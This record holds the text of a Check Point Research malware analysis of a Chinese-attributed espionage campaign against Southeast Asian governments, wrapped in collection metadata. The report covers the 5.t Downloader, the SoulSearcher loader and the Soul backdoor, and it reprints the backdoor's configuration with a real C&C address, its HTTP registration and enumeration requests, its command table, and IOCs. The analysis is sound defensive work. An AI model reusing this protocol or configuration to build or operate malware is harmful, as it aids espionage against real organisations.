{
    "id": "38cef7da-98fe-4dea-9687-ab22a122201b",
    "created_at": "2023-04-05T02:08:19.295885Z",
    "updated_at": "2025-03-27T02:16:01.188846Z",
    "deleted_at": null,
    "sha1_hash": "6bd1fecf0cd44e4bfe7461bbee05bef6c874b2ac",
    "title": "2023-03-07 - Pandas with a Soul- Chinese Espionage Attacks Against Southeast Asian Government Entities",
    "authors": "",
    "file_creation_date": "2023-04-03T08:26:35Z",
    "file_modification_date": "2023-04-03T08:26:35Z",
    "file_size": 4063972,
    "plain_text": "# Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government Entities\n\n**[research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/](https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/)**\n\nMarch 7, 2023\n\n## Executive summary\n\nIn 2021, Check Point Research published a report on a previously undisclosed toolset used by Sharp\nPanda, a long-running Chinese cyber-espionage operation targeting Southeast Asian government entities.\nSince then, we have continued to track the use of these tools across several operations in multiple\nSoutheast Asian countries, in particular nations with similar territorial claims or strategic infrastructure\nprojects such as Vietnam, Thailand, and Indonesia.\n\n**Key findings:**\n\nIn late 2022, a campaign with an initial infection vector similar to previous Sharp Panda operations\ntargeted a high-profile government entity in the region.\nWhile Sharp Panda’s previous campaigns delivered a custom and unique backdoor\ncalled VictoryDll, the payload in this specific attack is a new version of SoulSearcher loader, which\neventually loads the Soul modular framework. Although samples of this framework from 2017[2021 were previously analyzed, this report is the most extensive look yet at the Soul malware family](https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware)\ninfection chain, including a full technical analysis of the latest version, compiled in late 2022.\n\n\n-----\n\n[Although the Soul malware framework was previously seen in an espionage campaign targeting the](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-south-east-asia)\ndefense, healthcare, and ICT sectors in Southeast Asia, it was never previously attributed or\nconnected to any known cluster of malicious activity. Although it is currently not clear if the Soul\nframework is utilized by a single threat actor, based on our research we can attribute the framework\nto an APT group with Chinese origins.\nThe connection between the tools and TTPs (Tactics, Techniques and Procedures) of Sharp Panda\nand the previously mentioned attacks in Southeast Asia might serve as yet another example of key\ncharacteristics inherent to Chinese-based APT operations, such as sharing custom tools between\ngroups or task specialization, when one entity is responsible for the initial infection and another one\nperforms the actual intelligence gathering.\n\n## Introduction\n\n[At the beginning of 2021, Check Point Research identified an ongoing surveillance operation we named](https://research.checkpoint.com/2021/chinese-apt-group-targets-southeast-asian-government-with-previously-unknown-backdoor/)\nSharp Panda that was targeting Southeast Asian government entities. The attackers used spear-phishing\nemails to gain initial access to the targeted networks. These emails typically contained a Word document\nwith government-themed lures that leveraged a remote template to download and run a malicious RTF\ndocument, weaponized with the infamous RoyalRoad kit. Once inside, the malware starts a chain of inmemory loaders, comprised of a custom DLL downloader we call 5.t Downloader and a second-stage\nloader responsible for the delivery of a final backdoor. The final payload observed in Sharp Panda\ncampaigns at the time was VictoryDll, a custom and unique malware that enabled remote access and\ndata collection from the infected device. We tracked several earlier versions of the VictoryDll backdoor\nback to at least 2017, with the whole operation remaining under the radar the entire time.\n\nFurther tracking of Sharp Panda tools revealed multiple campaigns that targeted entities in Southeast\nAsian countries, such as Vietnam, Indonesia, and Thailand. During this time, multiple minor changes were\nimplemented in the 5.t Downloader itself, but in general, the initial part of the infection chain (the use of\nWord documents, RoyalRoad RTF and 5.t Downloader) remained the same. However, in early 2023,\nwhen investigating an attack against one of the government entities located in the targeted region, the\npayload received from the actor’s geo-fenced C&C server was different from the VictoryDll backdoor\n[observed before. Further analysis revealed that this payload is a new version of SoulSearcher loader,](https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware)\nwhich is responsible for downloading, decrypting, and loading in memory other modules of the Soul\n**modular backdoor.**\n\nFigure 1 – The infection chain.\n\n\n-----\n\n[The use of the Soul malware framework was described by Symantec in relation to the unattributed](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-south-east-asia)\nespionage operation targeting defense, healthcare, and ICT sectors in Southeast Asia in 2020-2021.\nFollowing up on that report, Fortinet researchers discovered other samples from 2017-2021\n[and described the evolution of the framework. Soul was also seen in 2019 in attacks against Vietnamese](https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware)\ntargets. None of these public reports attributed the Soul framework to any specific country or known actor,\nalthough researchers noted the “competent adversarial tradecraft” which they believed indicated a\n“possibly state-sponsored” group.\n\nIn this report, we provide a detailed technical explanation of several malicious stages used in this infection\nchain and the latest changes implemented in the Soul framework. We also discuss the challenges in\nattributing these attacks.\n\n## Downloader\n\nThe downloader, which in this specific case was dropped by RoyalRoad RTF to the disk as res6.a, is\nexecuted by a scheduled task with rundll32.exe, StartA. Its functionality is consistent with\n[previous research of Sharp Panda activity. Similar to previous Sharp Panda campaigns, the C&C servers](https://research.checkpoint.com/2021/chinese-apt-group-targets-southeast-asian-government-with-previously-unknown-backdoor/)\nof the attackers are geofenced and return payloads only to requests from the IP addresses of the\ncountries where the targets are located.\n\nIn the latest campaign, the actors implemented some changes in the downloader’s communication with\nthe C&C. Previously, the entire C&C communication was based on sending data encrypted using RC4\nand encoded with base64, with an exception for the HTTP request for payload which contained the\nhostname in plain text in the URI: /[**hostname]**.html.\n\nHowever, in the new samples, the payload request is issued to the same PHP path as all the previous\nrequests, with the host specified in its parameter, both MD5-hashed and in clear-text: [host_name]*\n```\n[host_name_md5], e.g. MyComputer*d2122d4f4cdf26faa1b2f73bda6030f4 and then encoded:\n/[php_name].php?Data=[encoded<host_name_and_host_md5>]\n\n```\nIt’s noteworthy that while different keys were used, the encoding method using RC4+Base64 remained\nconsistent in all cases.\n\nIn addition to changes in the URL patterns, the actors refrained from using the distinctive UserAgent “Microsoft Internet Explorer” and instead used a hardcoded generic one. A few of the\nsamples we observed also communicated through HTTPS, not HTTP. Unlike the previous version where\nonly the API calls were obfuscated, the new version also uses string encryption. However, the encryption\nis quite simple and consists of loop XORing an encrypted character with the difference of a loop index and\na constant value:\n\n\n-----\n\nFigure 2 –\n\nString decryption routine in the newest version of 5.t Downloader.\nAs in previous versions, the downloader gathers data from the victim’s computer including hostname, OS\nname and version, system type (32/64 bit), username, MAC addresses of the networking adapters, and\ninformation on anti-virus solutions. If the threat actors find the victim’s machine to be a promising target,\nthe response from the server contains the next stage executable in encrypted form and its MD5\nchecksum. After verifying the integrity of the received message, the downloader loads the decrypted DLL\nto memory and starts its execution from the StartW export function (the same name as the next stage\nloader export in previous campaigns that used the downloader).\n\n## SoulSearcher loader\n\n[SoulSearcher is a second-stage loader, which according to Fortinet research was seen in the wild since at](https://www.fortinet.com/blog/threat-research/unraveling-the-evolution-of-the-soul-searcher-malware)\nleast November 2018 and is responsible for executing the Soul backdoor main module and parsing its\nconfiguration. SoulSearcher has multiple variants based on where the configuration and payload are\nlocated and on the type of configuration. Among the samples used in the more recent activity cluster we\nhave been researching, the SoulSearcher DLL (sha256:\nd1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0) was slightly different\nfrom any previously discovered samples, with the backdoor embedded inside the data section and the\nembedded configuration in XML format.\n\nThe malware checks if it runs under a process named svchost.exe, msdtc.exe or spoolsv.exe. If it does,\nit starts a thread on StartW export and continues loading the backdoor. This might be an indication of the\nloader being used in different infection chains than we observed in this attack with the rundll32.exe\ndirectly starting a chain of in-memory DLL loaders from StartW.\n\nThe payload loading process starts with obtaining the configuration. While previously seen XML\nSoulSearchers retrieved this from the registry, a file mapping object, or a file on the disk, the newest\nversion loads the config from a hardcoded Base64 string and stores it in the registry\npath HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\CONFIGEX. The decoded data blob can be\nrepresented with the following struct:\n```\nstruct compressed_data\n\n{\n\n DWORD magic;\n\n DWORD unused;\n\n BYTE lzma_properties[5];\n\n DWORD size;\n\n DWORD compressed_size;\n\n BYTE decompressed_data_MD5[33];\n\n BYTE compressed_data_MD5[33];\n\n BYTE compressed_data[];\n\n};\n\n```\n\n-----\n\nThe loader contains a compressed Soul backdoor DLL in the data section of the loader, while previous\nsamples stored it in the overlay.\n\nNext, based on the system architecture, SoulSearcher appends 32 or 64 to the wide\nstring L'ServerBase', hashes the resulting string with MD5, and creates the registry key with this\nhash: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies\\[ServerBaseArch_md5]. The value\ncontains the compressed payload.\n\nIf the registry key is successfully created, the loader reads the compressed payload and proceeds to\ndecrypt and load it in memory. The loading process itself is not different from previously discussed\nvariants of SoulSearcher: it uses the compressed_data structure from the configuration to validate MD5\nchecksums, LZMA-decompress the compressed module, and reflectively load the Soul main module DLL\nin memory.\n\nAfter loading the backdoor, Soul Searcher resolves the Construct export of the backdoor and calls it with\nthe arguments [ServerBaseArch_md5] -Startup.\n\n## Soul Backdoor (main module)\n\nThe Soul main module is responsible for communicating with the C&C server and its primary purpose is to\nreceive and load in memory additional modules. Interestingly, the backdoor configuration contains a “radio\nsilence”-like feature, where the actors can specify specific hours in a week when the backdoor is not\nallowed to communicate with the C&C server.\n\nThe recovered sample of the backdoor is quite different from the samples that were previously analyzed.\nThe new version of SoulBackdoor was compiled on 29/11/2022 02:12:34 UTC. Based on their\ntimestamps, the earlier samples analyzed by other researchers are mostly from 2017 with the exception of\none from 2018, which, similar to our case, was embedded inside the SoulSearcher loader.\n\nThe backdoor implements a custom C&C protocol, which is entirely different than previously observed\nversions. Both the old and new versions are based on HTTP communication, but the latest version seems\nto be more complex and uses various HTTP request methods such as GET, POST, and DELETE. The API\nendpoints are also different, and the C&C requests contain additional HTTP request headers. In terms of\nthe backdoor functionality, the enumeration data is different from the previous versions and is more\nextensive. The supported C&C commands, with the newer variant primarily focused on loading additional\nmodules, lack any type of common backdoor functionality like manipulating local files, sending files to the\nC&C, and executing remote commands.\n\n### Configuration and execution flow\n\nThe backdoor requires two arguments or the “-v” argument before performing its activity. As we\nmentioned earlier, in our case it is executed by SoulSearcher with [ServerBaseArch_md5] ```\nStartup arguments.\n\n```\nSoul backdoor first creates an event using the hardcoded name Global\\3GS7JR4S and checks the registry\nkey HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF. It then uses the same configuration (from the registry\nkey HKEY_CURRENT_USER\\SOFTWARE\\Software\\Microsoft\\CTF\\CONFIGEX) with\nthe compressed_data struct (as used by SoulSearcher) to extract the payload and decompress its own\n\n\n-----\n\nconfiguration. The configuration of the main module provides the parameters of C&C communication and\nother aspects of the backdoor execution. The compression algorithm is LZMA, similar to that found in\nolder variants. After decompression, the config looks like this:\n```\n<CONFIG FLAG=\"X6bmLMbAL29AlxB\">\n\n <BASE>\n\n  <Ip>http://103.159.132.96/index.php</Ip>\n\n  <Dns>8.8.8.8|114.114.114.114|</Dns>\n\n  <Proxy></Proxy>\n\n  <CntPort>80|443</CntPort>\n\n  <LstPort>0</LstPort>\n\n  <Blog>NULL</Blog>\n\n  <DropboxBlog>NULL</DropboxBlog>\n\n  <HTTPS>false</HTTPS>\n\n </BASE>\n\n <SVC>\n\n  <SvcName>IKEEXT</SvcName>\n\n  <SvcDisp>@%SystemRoot%\\system32\\ikeext.dll,-501</SvcDisp>\n\n  <SvcDesc>@%SystemRoot%\\system32\\ikeext.dll,-502</SvcDesc>\n\n  <SvcDll>wlbsctrl.dll</SvcDll>\n\n </SVC>\n\n <ADV>\n\n  <OlPass>NULL</OlPass>\n\n<OlTime>1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,\n</OlTime>\n\n  <SelfDestroy>2029-07-11 15:29:32</SelfDestroy>\n\n </ADV>\n\n</CONFIG>\n\n```\nIn its base (<BASE>) settings, the configuration contains the parameter “LstPort”. In the previous versions,\nthis provided the backdoor the ability to listen on a specified port. In this version, the code that supported\nthis feature was removed, and the backdoor can only actively connect to the C&C server using the URL\nprovided in the “IP” parameter on the “connect” port “Cnt”.\n\nIn the “advanced” section (<ADV>) of the configuration, the “OlTime” parameter contains a list of 168\n(24×7) numbers, one per hour in a week. Each hour is represented either by 0 or 1. Zero means a\n“blocked” hour, and one represents an “allowed” hour. This way the operators of the malware can use the\nconfiguration to enforce the specific hours the backdoor is allowed to communicate with the C&C server. If\nthe OlTime field is empty in the config, a default setting is for all days and hours to be configured as\n“allowed”. This is an advanced OpSec feature that allows the actors to blend their communication flow into\ngeneral traffic and decrease the chances of network communication being detected. The “service” (<SVC>)\nsection defines the parameters for the backdoor to be installed as a service:\n```\n <SVC>\n\n  <SvcName>IKEEXT</SvcName>\n\n  <SvcDisp>@%SystemRoot%\\system32\\ikeext.dll,-501</SvcDisp>\n\n  <SvcDesc>@%SystemRoot%\\system32\\ikeext.dll,-502</SvcDesc>\n\n  <SvcDll>wlbsctrl.dll</SvcDll>\n\n </SVC>\n\n```\nThe Symantec publication also mentioned the Soul Searcher running as a service, but in the sample we\nanalyzed, there is no code that implements this feature. Judging by the settings left in the configuration we\n[observed, the actors performed some variation of IKEEXT DLL Hijacking, when on the start of the IKEEXT](https://infosecwriteups.com/ikeext-dll-hijacking-3aefe4dde7f5)\nservice, svchost.exe would load the malicious DLL, saved as wlbsctrl.dll.\n\n\n-----\n\nAfter loading and parsing the configuration the backdoor checks the\nregistry HKEY_CURRENT_USER\\SOFTWARE\\Software\\Microsoft\\CTF\\Assemblies for the existence of a key\nwith the name of MD5 hash of the wide string L\"AutoRun\". If it exists, the backdoor decompresses, loads\nin memory, and executes the Construct export of the DLL stored in this key. Although we didn’t witness\nthe creation or usage of this additional DLL payload, this logic is likely used for auto-updates or executing\nspecific actions prior to the main backdoor activity.\n\nAfter all of these steps are concluded, the backdoor begins the execution of its main thread.\n\n### C&C communication\n\nThe main thread begins by validating that it received from the configuration the C&C URL and DNS (or\nblog URL, which is empty in our case), and that the C&C URL starts with http://, https:// or ftp://. In\nthis specific sample, we did not observe any type of FTP communication capabilities. Then, if the current\nhour is “allowed” by OlTime configuration, it begins the C&C communication.\n\n**Bot registration and victim fingerprinting**\n\nThe first request is sent to the specified URL with the ClientHello parameter. The MD5 header is an\nMD5 hash of the body. As there is no data transferred by this request, the MD5\n(d41d8cd98f00b204e9800998ecf8427e) is of an empty string. In further analysis of the requests, we omit\nthe common headers (Cache-Control, Connection, User-Agent, MD5 and Host) as their meaning doesn’t\nchange between the requests.\n```\nGET /index.php?ClientHello HTTP/1.1\n\nCache-Control: no-cache\n\nConnection: Keep-Alive\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)\n\nMD5: d41d8cd98f00b204e9800998ecf8427e\n\nContent-Length: 0\n\nHost: 103.159.132.96\n\n```\nThe expected response from the C&C server is ERR! ParamError! In case of a bad or no response, the\nbackdoor attempts to resolve the IP address of the C&C server on its own through the DNS servers in the\nconfig.\n\nFigure 3 –\n\nC&C DNS resolution\n\n\n-----\n\nIf the response is correct, it saves the C&C IP address in this format: SVR:[IP_field_from_config]:\n```\n[CntPort] to the registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\SVIF.\n\n```\nNext, the module performs a full system enumeration and collects the following data:\n\nProcessor name and the number of processors, total physical memory and total available physical\nmemory, and information about the hard disk such as total space and free space.\nThe OS architecture and various information from the HKLM\\SOFTWARE\\Microsoft\\Windows\n```\n   NT\\CurrentVersion registry key such as ProductName, CSDVersion, ProductId, RegisteredOwner,\n\n```\nRegisteredOrganization etc.\nComputer name and information about the current user, such as admin rights retrieved\nwith NetUserGetInfo API.\nTime zone information from\nboth HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation and HKLM\\SOFTWARE\\Micr\n```\n   osoft\\Windows NT\\CurrentVersion\\Time Zones registry.\n\n```\nLocal IP address of the machine, and its public IP address, obtained by issuing a request to one of\nthe public IP resolution services such as https://www.whatismyip.com/:\n\nFigure 4 – Victim machine enumeration data string\nAfter the system enumeration, the backdoor generates a botUUID, concatenating with “-” two MD5 strings\nbased on various parameters from the enumerated data. It saves the botUUID to the registry\nkey HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\UUID. The resulting botUUID looks like this:\n```\n5d41402abc4b2a76b9719d911017c592-7d793037a0760186574b0282f2f435e7\n\n```\nand is used in all the following network requests.\n\n**New C&C connection**\n\nAfter the system enumeration, the backdoor issues a series of requests to “register” a new connection and\nperform validation against the C&C server.\n\nFirst, the backdoor notifies the server of a new connection. It is implemented as a DELETE request with\nthe botUUID:\n```\nDELETE /index.php?[botUUID];[botUUID].txt HTTP/1.1\n\n```\nThe accepted response from the C&C: OK!\n\nNext, the Connect request is sent, whose body contained Base64 of the string ConnectXXXXXXXX,\nwhere XXXXXXXX is the connection timestamp retrieved by GetTickCount() API.\n```\nPOST /index.php?[botUUID]/REQ.dat HTTP/1.1\n\n[Base64-encoded string]\n\n```\n\n-----\n\nThe accepted response from the C&C: OK!\n\nThe following request prepares the server to receive the enumeration data from the victim’s machine:\n```\nGET /index.php?Enum;[botUUID]_[connection_timestamp].txt HTTP/1.1\n\n```\nThe accepted response from the C&C is a string that looks like\nthis: ./Updata/[botUUID]_[connection_timestamp].txt.\n\nThis is most likely the path on the server to store the enumeration data.\n\nAfter this the backdoor sends another network request, possibly for verification:\n```\nGET /index.php?D;[botUUID]_[connection_timestamp].txt HTTP/1.1\n\n```\nThe accepted response is a base64-encoded string that contains the botUUID.\n\nAt the end of this process, if all the requests are successful, the backdoor is “registered” at the C&C\nserver and continues sending information about the system.\n\n**Send enumerated data**\n\nFrom this point on, the data sent between the backdoor and the C&C server relies on another\nstruct, c2_body:\n```\nstruct c2_body\n\n{\n\n DWORD special_flag;\n\n DWORD additional_data;\n\n DWORD const_float;\n\n BYTE command_id;\n\n};\nconst_float, where used, is a hardcoded value, 5.2509999. special_flag and additional_data seem\n\n```\nto be multipurpose variables that have different meanings in different contexts of the program execution.\nWhen sent in the body of both requests and responses, this struct is compressed according to the\npreviously described compressed_data struct from SoulSearcher, and then encoded with Base64.\n\nFirst, the backdoor sends the current timestamp in the request to the following URL (a new timestamp is\nagain retrieved by GetTickCount() API).\n```\nPOST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat\nHTTP/1.1\n\n[base64-encoded and compressed c2_body]\n\n```\nIn this request, special_flag is 0x00, command_id is 0x01 and additonal_data is the tick count. The\naccepted response is OK! Otherwise, the backdoor sleeps and starts the connection from the beginning.\n\nNext, the backdoor collects the enumeration data again, and compresses it using another struct:\n```\nstruct enum_compressed_data\n\n{\n\n c2_body c2_msg;\n\n compressed_data enum_data;\n\n};\n\n```\n\n-----\n\nThe struct is then encoded with Base64 and sent in the body of the following request (the URL and\nmethods are the same):\n```\nPOST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat\nHTTP/1.1\n\n[base64-encoded and compressed enum_compressed_data]\n\n```\nThe command_id is the same 0x01, special_flag=0, additional_data= 0x4000 + 0x49 = size of enum\ndata.\n\nThe accepted response is also OK!\n\n**Main C&C loop**\n\nAfter posting the enumeration data, the backdoor enters an infinite loop, contacting the C&C server with\nthe following request to receive the commands:\n```\nGET /index.php?CDD;[botUUID]_[connection_timestamp].txt;[botUUID]_[connection_timestamp]/Data_C_*\nHTTP/1.1\n\n```\nIf there is no C&C command for the victim, the server responds with ERR! Path not found, WAIT!\n\nIf there is a command to execute, the C&C returns it in a base64-encoded string which is decompressed\nwith compressed_data and parsed as c2_body. Then the command_id from the struct is translated to the\nactual command execution.\n\n### Soul Backdoor Commands\n\nThe main commands that can be received from the C&C server are control messages for the bot:\n\n**Command**\n**ID** **Action** **Description**\n\n\n0x04 Execute\ncommand\n\n\nCreate a thread that handles commands from the second set of\ncommands.\n\n\n0x0D Client keep-alive Mirror the request from the C&C server.\n\n\n0x0E Restart C&C\nsession\n\n\nSend DELETE request and restart the communication from client\nHello.\n\n\n0x0F Exit Send DELETE request and exit process forcefully.\n\nIf in the c2_body the special_flag is set to one, the backdoor starts a continuous loop requesting data\nfrom the C&C server. The server should respond with a module name to be loaded from\nthe Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies registry key, which is\nexecuted from its Construct export. Then the backdoor proceeds to execute the command specified\nin command_id.\n\nIf the command_id is 0x04, the backdoor spawns a new “command execution” thread that performs a\nsimilar network communication flow as the main thread, only without sending the enumeration data.\n\nIt then begins handling the following commands:\n\n\n-----\n\n**CommandCommand**\n**IDID** **ActionAction** **DescriptionDescription**\n\n0xF Exit thread If the command_flag is on stop, exit the “command execution” thread. Otherwise\ndo nothing\n\n\n0x61 Install\nmodules\n\n0x62 Delete\nmodules\n\n0x63 Validate\nmodules\n\n0x64 Load\nmodule\n\n0x65 Enumerate\nmodules\n\n\nThe server sends the number of modules to be written to the registry. Then the\nbot makes requests to the C&C server, once per module and writes it to a\nspecified registry key. Validate the result by executing command 0x65 afterward.\n\nAll the registry keys are\nunder Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies.\n\nDelete registry keys that are sent by the C&C in a string separated by semicolons (;). Validate the result by executing command 0x65 afterward.\n\nValidate that modules are currently compatible with the system architecture.\nThe modules are located in the registry, and registry keys names are sent by\nthe C&C separated by a semi-colon.\n\nLoad the specified module and call its export function Construct. The registry\nkey where the module is stored is sent by the C&C server.\n\nCreate a buffer with all registry keys\nunder Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies in\nthe format of %s:%f:; (key name and first 4 bytes of the value), then send the\nbuffer back to the C&C.\n\n\nAll the received modules are stored compressed in the registry. The decompression is performed\naccording to another struct:\n```\nstruct stored_module\n\n{\n\n float version_or_id;\n\n QWORD decompressed_size;\n\n QWORD compressed_size;\n\n BYTE md5sum[33];\n\n BYTE compressed_data[];\n\n};\n\n```\nWe didn’t witness any follow-up modules, but due to the modular nature of the backdoor, we can expect\nthe actors to use all kinds of data-stealing modules, keyloggers, data exfiltration modules and likely also a\nlateral movement toolset.\n\n## Attribution\n\nAs the first stages of the infection chain are identical to the previously described Sharp Panda activity,\nmany of the indicators that allowed us to attribute the threat actors to Chinese-based threat groups are\nstill relevant in relation to the subsequent attack attempts described in this report:\n\nThe RoyalRoad RTF kit was reported as the tool of choice among Chinese APT groups and is still\nused despite the exploitation of old patched vulnerabilities. This implies that at least a portion of the\nattacks using it are successful, and the threat actors are familiar with the cybersecurity practices of\ntheir targets.\nOver the past several years, the C&C servers consistently return payloads only between 01:00 –\n08:00 UTC Monday-Friday, which we believe represents the actors’ working hours.\n\n\n-----\n\n[The C&C servers did not return payloads during the period of the Chinese Spring Festival, even](https://publicholidays.cn/2023-dates/)\nduring working hours.\nThe victimology of the attacks is consistent with Chinese interests in Southeast Asian countries,\nparticularly those with similar territorial claims or strategic infrastructure projects.\n\nIn addition, the Soul Backdoor configuration contains 2 hardcoded DNS services, one of which is a\n[Chinese 114DNS Free Public DNS service which is not commonly used outside the region.](https://www.114dns.com/index.html)\n\nThe campaign discussed in this report involves the malicious artifacts from different clusters of malware\nactivity. As sharing custom tools or operational methods is common among Chinese-based threat actors\nto facilitate intrusion efforts, it poses a challenge to their attribution. In addition to observing different\ntoolsets from two previously not connected clusters (Sharp Panda and previous attacks using the Soul\nframework), other areas of overlap between publicly tracked Chinese APT groups and this campaign\ninclude the following:\n\nInfrastructure: One of the IP addresses used by Sharp Panda’s initial infection in late 2021 overlaps\n[with the IP reportedly used by TAG-16 in the same timeframe. In the relevant report, the Insikt](https://go.recordedfuture.com/hubfs/reports/cta-2021-1208.pdf)\nGroup researchers provided evidence suggesting that TAG-16 shares custom capabilities with the\nPeople’s Liberation Army (PLA)-linked activity group RedFoxtrot.\nThe Southeast Asian government entity attacked in the described campaign was also targeted by a\ntool [attributed to a Chinese-linked APT group during the same time period. However, there is](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks)\ncurrently no clear evidence to tie the tool to this campaign with high confidence.\n[Symantec researchers also discovered the APT30 toolset in the network of one of the organizations](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-south-east-asia)\nattacked with the Soul framework in the same timeframe, with no distinctive connection as well.\n\nThe vague links of all the aforementioned groups to Chinese intelligence Services, the nature of the\ntargets, and the capabilities of the toolset used lead us to the conclusion that the described activity is an\nespionage operation likely executed by well-resourced and possibly nation-state threat actors.\n\n## Conclusion\n\nIn this report, we analyzed the TTPs and the tools used in the espionage campaign against Southeast\nAsian government entities. The initial infection stages of this campaign use TTPs and tools consistent with\nSharp Panda activity first discovered in 2021. We continue to track Sharp Panda as a separate unknown\ncluster, and based on our current insight into this threat, we cannot confirm with high confidence their\nrelation to other Chinese threat actors.\n\nThe later stages of the infection chain in the described campaign are based on Soul, a previously\nunattributed modular malware framework. While the Soul framework has been in use since at least 2017,\nthe threat actors behind it have been constantly updating and refining its architecture and capabilities.\nBased on the technical findings presented in our research, we believe this campaign is staged by\nadvanced Chinese-backed threat actors, whose other tools, capabilities, and position within the broader\nnetwork of espionage activities are yet to be explored.\n\n## IOCs\n\n### C&C servers\n\n45.76.190[.]210\n\n\n-----\n\n45.197.132[.]68\n45.197.133[.]23\n103.78.242[.]11\n103.159.132[.]96\n103.173.154[.]168\n103.213.247[.]48\n139.180.137[.]73\n139.180.138[.]49\n152.32.243[.]17\noffice.oiqezet[.]com\n\n### Hashes\n\n**Phishing documents**\n\n32a0f6276fea9fe5ee2ffda461494a24a5b1f163a300bc8edd3b33c9c6cc2d17\nca7f297dc04acad2fab04d5dc2de9475aed4186805f6c237c10b8f56b384cf30\n341dee709285286bc5ba94d14d1bce8a6416cb93a054bd183b501552a17ef314\n9d628750295f5cde72f16da02c430b5476f6f47360d008911891fdb5b14a1a01\n811a020b0f0bb31494f7fbe21893594cd44d90f77fcd1f257925c4ac5fabed43\nb023e2b398d552aacb2233a6e08b4734c205ab6abf5382ec31e6d5aa7c71c1cb\n\n**External template (RoyalRoad RTF)**\n\n81d9e75d279a953789cbbe9ae62ce0ed625b61d123fef8ffe49323a04fecdb3f\n12c1a4c6406ff378e8673a20784c21fb997180cd333f4ef96ed4873530baa8d3\nf2779c63373e33fdbd001f336df36b01b0360cd6787c1cd29a6524cc7bcf1ffb\n7a7e519f82af8091b9ddd14e765357e8900522d422606aefda949270b9bf1a04\n4747e6a62fee668593ceebf62f441032f7999e00a0dfd758ea5105c1feb72225\n3541f3d15698711d022541fb222a157196b5c21be4f01c5645c6a161813e85eb\n\n**5.t Downloader**\n\n0f9f85d41da21781933e33dddcc5f516c5ec07cc5b4cff53ba388467bc6ac3fd\n17f4a21e0e8c0ce958baf34e45a8b9481819b9b739f3e48c6ba9a6633cf85b0e\nf8622a502209c18055a308022629432d82f823dd449abd9b17c61e363a890828\n1a15a35065ec7c2217ca6a4354877e6a1de610861311174984232ba5ff749114\n065d399f6e84560e9c82831f9f2a2a43a7d853a27e922cc81d3bc5fcd1adfc56\n1e18314390302cd7181b710a03a456de821ad85334acfb55f535d311dd6b3d65\nc4500ad141c595d83f8dba52fa7a1456959fb0bc2ee6b0d0f687336f51e1c14e\n390e6820b2cc173cfd07bcebd67197c595f4705cda7489f4bc44c933ddcf8de6\n\n**SoulSearcher**\n\nd1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0\n\n**Soul Backdoor**\n\ndf5fe7ec6ecca27d3affc901cb06b27dc63de9ea8c97b87bc899a79eca951d60\n\n\n-----\n\nGO UP\n[BACK TO ALL POSTS](https://research.checkpoint.com/latest-publications/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-07 - Pandas with a Soul- Chinese Espionage Attacks Against Southeast Asian Government Entities.pdf"
    ],
    "report_names": [
        "2023-03-07 - Pandas with a Soul- Chinese Espionage Attacks Against Southeast Asian Government Entities.pdf"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
